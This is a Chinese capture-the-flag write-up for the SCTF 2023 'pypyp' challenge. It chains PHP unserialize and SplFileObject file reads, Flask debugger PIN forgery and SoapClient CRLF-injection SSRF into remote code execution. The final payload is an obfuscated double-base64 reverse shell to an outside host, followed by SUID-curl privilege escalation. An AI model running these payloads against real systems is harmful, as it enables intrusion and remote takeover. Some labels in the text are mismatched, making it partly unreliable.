### **pypyp**

docker环境搭建

docker pull lxxxin/sctf2023_pypyp
docker run -it -d -p 12345:80 -e FLAG=flag{8382843b-d3e8-72fc-6625-ba5269953b23} lxxxin/sctf2023_pypyp

PHP_SESSION_UPLOAD_PROGRESS 强制session start

```
import requests
url = "环境地址"
data = {
    "PHP_SESSION_UPLOAD_PROGRESS":"a"
}
file = {
    "file": ("a","a")
}
cookies = {
    "PHPSESSID": "a"
}
proxies = {
    "http": "127.0.0.1:8081" 
}
req = requests.post(url, data=data, files=file, cookies=cookies, proxies=proxies)
print(req.text)
```

利用`SESSION_UPLOAD_PROGRESS`创建一个 session 的原理如下：

1. 当发起一个文件上传请求时，PHP 会自动创建一个名为 `SESSION_UPLOAD_PROGRESS` 的 session 变量。
2. 此时，`SESSION_UPLOAD_PROGRESS` 变量存储了当前文件上传的状态信息，包括文件大小、上传进度等。
3. PHP 会定期地将 `SESSION_UPLOAD_PROGRESS` 变量的值更新到服务器的 session 存储中。
4. 在上传过程中，可以通过读取 `SESSION_UPLOAD_PROGRESS` 变量的值来获取上传的进度信息，例如文件大小、已上传字节数等。
5. 利用这个进度信息，我们可以在前端页面上显示一个进度条或者其他形式的上传进度提示。

总结来说，`SESSION_UPLOAD_PROGRESS` 是 PHP 提供的一个机制，用于跟踪文件上传的进度。它通过 session 变量存储上传状态信息，并在上传过程中不断更新。通过读取这个变量的值，可以获取上传的进度信息，从而实现上传进度的展示和处理。

拿到的源码：

```
<?php
    error_reporting(0);
    if(!isset($_SESSION)){
        die('Session not started');
    }
    highlight_file(__FILE__);
    $type = $_SESSION['type'];
    $properties = $_SESSION['properties'];
    echo urlencode($_POST['data']);
    extract(unserialize($_POST['data']));
    if(is_string($properties)&&unserialize(urldecode($properties))){
        $object = unserialize(urldecode($properties));
        $object -> sctf();
    exit();
    } else if(is_array($properties)){
        $object = new $type($properties[0],$properties[1]);
    } else {
        $object = file_get_contents('http://127.0.0.1:5000/'.$properties);
    }
    echo "this is the object: $object <br>";

?>
```

SplFileObject类读取文件：

这里读文件的题目代码为：

```
extract(unserialize($_POST['data']));
if(is_array($properties)){
        $object = new $type($properties[0],$properties[1]);
    }
```

通过将data反序列化后，通过extract函数给数组的键值赋为变量，然后通过new $type($properties[0],$properties[1]); 这一部分利用了SplFileObject类

```
<?php
$data["type"] = "SplFileObject";
$data["properties"][0] = "php://filter/read=convert.base64-encode/resource=/proc/sys/kernel/random/boot_id";
$data["properties"][1] = "r";
echo serialize($data);
```

计算PIN需要以下几个参数：

- 运行Flask程序的用户名（可以在/etc/passwd中找到）
- flask的包路径（其值类似于/usr/local/lib/python3.8/site-packages/flask/app.py）
- /sys/class/net/eth0/address
- /proc/sys/kernel/random/boot_id
- /proc/self/cgroup

我读取到的：

a31935e7-2f8b-4b65-b824-de6222c9c470     （boot_id）

02:42:ac:11:00:07         (/sys/class/net/eth0/address)

a5001b18a8bfee1ff69a555688cc1a271d35f17fffe88e690f321f68e20b395b      (/sys/class/net/eth0/address)

app.py的源码：

```
from flask import Flask

app = Flask(__name__)

@app.route('/')
def index():
    return 'Hello World!'

if __name__ == '__main__':
    app.run(host="0.0.0.0",debug=True)
```

SoapClient类对于SSRF的利用：

```
<?php
$data = "name=admin";
$lendata = strlen($data);
$ua = "host\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: $lendata\r\n\r\n$data";
$client = new SoapClient(null,array('uri' => 'host' , 'location' => 'http://127.0.0.1:9999/test' , 'user_agent' => $ua));
$client->getFlag();
```

flask计算pin的脚本：

```
import hashlib
from itertools import chain
import time
probably_public_bits = [
    'app'# /etc/passwd
    'flask.app',# 默认值
    'Flask',# 默认值
    '/usr/local/lib/python3.9/dist-packages/flask/app.py' # 报错得到
]

private_bits = [
    str(int('02:42:ac:11:00:07'.replace(":", ""), 16)), # /sys/class/net/eth0/address
    'a31935e7-2f8b-4b65-b824-de6222c9c470' + # /proc/sys/kernel/random/boot_id
    'a5001b18a8bfee1ff69a555688cc1a271d35f17fffe88e690f321f68e20b395b' # /proc/self/cgroup
]

h = hashlib.sha1() # 有些版本是md5，Python3大部分版本是sha1
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print("pin为: " + rv)
cookie = str(int(time.time())) + "|" + hashlib.sha1(f"{rv} added salt".encode("utf-8", "replace")).hexdigest()[:12]
print(f"cookie为: {cookie_name}={cookie}")

```

console的获取：

题目对应代码为：

```
extract(unserialize($_POST['data']));
$object = file_get_contents('http://127.0.0.1:5000/'.$properties);
```



```
<?php
$data["properties"] = "console";
echo serialize($data);
//a:1:{s:10:"properties";s:7:"console";}
```

我的SECRET：

yqZt4PZtLEjq9y4mt1Lz

然后RCE:

这里需要开启 SOAP 扩展

extension=soap

```
<?php
$data = "name=admin";
$lendata = strlen($data);
$cookie = "__wzd1cebf2989b4eebb2a577=1687509747|5b1000f3f6c5";
$cmd = 'echo${IFS}TDJKcGJpOWlZWE5vSUMxcElENG1JQzlrWlhZdmRHTndMekV1TVM0eExqRXZNems1T1RrZ01ENG1NUT09|base64${IFS}-d|base64${IFS}-d|bash';
$s = "Y8jRuFsyHCoJ64lgXpk0";
$ua = "chen\r\nCookie: $cookie\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: $lendata\r\n\r\n$data";
$uri = 'http://127.0.0.1:5000/console?&__debugger__=yes&cmd=__import__("os").system("""$cmd""")&frm=0&s=$s';
$uri = str_replace('$s', "$s", $uri);
$uri = str_replace('$cmd', "$cmd", $uri);
$client = new SoapClient(null,array('uri' => 'chen' , 'location' => $uri, 'user_agent' => $ua));
$serdata["properties"] = urlencode(serialize($client));
echo serialize($serdata);
```

然后可以反弹shell，通过 find / -perm -u=s -type f 2>/dev/null     查找有权限的命令curl进行提权，然后查看flag

curl file:///flag